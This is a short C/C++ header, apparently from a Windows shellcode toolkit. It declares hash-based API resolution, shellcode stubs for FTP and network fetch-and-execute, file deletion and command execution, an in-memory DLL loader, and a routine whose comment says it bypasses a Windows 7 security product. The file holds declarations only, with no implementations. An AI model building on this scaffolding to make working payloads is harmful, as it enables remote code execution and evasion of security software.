/*
	Author: y11en
	Data: 2020.4
*/

#pragma once
#include "one.h"



typedef struct NativeApi
{
	HMODULE			kernel32;
	T_LoadLibraryA		loadlib;
	T_GetProcAddress	getproc;

	T_RtlZeroMemory zeromem;
	T_RtlMoveMemory movemem;

	T_VirtualAlloc	allocmem;
	T_VirtualFree	freemem;
	
	T_WinExec		winexec;
	T_ExitProcess	exitme;

	T_CopyFileA copyfile;


}NativeApi;

#define GET_FUNC(m, h, v, g) (v = (decltype(v))get_export_byhash(m, h, g))

extern "C"
{
	void init_api(NativeApi* func);
	void* sc_ftpapi();
	void* sc_ftpskt();
	void* sc_netexec();

	void* sc_d2e();
	void* sc_msgbox();
	void* sc_exec0();
	void* sc_delfile();

	void enable_godmod(NativeApi* func);	// bypass win7dunjia 不过这里就不给源码了
	void* mem_loaddll(NativeApi* func, void* dll, void* name, void* param, void** addr);
	void main_end();
}
